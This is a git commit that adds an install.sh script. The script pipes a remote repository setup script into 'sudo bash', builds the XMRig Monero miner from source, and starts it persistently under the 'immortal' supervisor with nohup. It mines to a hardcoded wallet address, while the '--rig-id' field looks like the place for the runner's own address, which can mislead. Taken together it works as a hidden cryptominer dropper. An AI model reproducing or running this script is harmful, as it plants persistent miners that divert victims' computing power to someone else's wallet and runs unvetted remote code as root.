b8570dd0717fecd9715cb18b92ea3fb4b0078b49
AzotoSolutions-dev <65345698+AzotoSolutions-dev@users.noreply.github.com>
2022-02-20 05:06:12 +0100

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,11 @@
+curl -s https://packagecloud.io/install/repositories/immortal/immortal/script.deb.sh | sudo bash
+apt install immortal
+sudo apt install libssl-dev 
+sudo apt-get install git build-essential cmake automake libtool autoconf
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/scripts
+./build_deps.sh && cd ../build
+cmake .. -DXMRIG_DEPS=scripts/deps
+make -j$(nproc)
+cd /root/xmrig/build
+immortal /bin/sh -c "nohup ./xmrig -o fr.minexmr.com:443 -u 46tfyDCzhgZH5xUWEnUJ7ngwfPa6apAppVD7tLqP1mkzDgRJnKP3nqMMKiCZq9aBUZGHsha5q95gkZLFEDaQo64rQ9jVn1X -k --tls --rig-id {YOUR-ADDRESS_XMR}"
